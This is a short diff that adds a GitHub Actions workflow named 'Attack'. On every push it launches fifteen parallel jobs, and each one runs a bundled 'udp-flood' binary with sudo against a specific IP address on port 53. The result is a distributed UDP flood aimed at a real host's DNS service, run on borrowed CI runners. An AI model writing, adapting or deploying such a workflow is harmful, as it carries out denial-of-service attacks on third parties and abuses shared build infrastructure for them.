@@ -1,0 +1,14 @@
+name: Attack
+on: [push]
+
+jobs:
+  alone:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
+
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x udp-flood
+      - run: echo y | sudo ./udp-flood 216.66.66.20 53 0 0 0
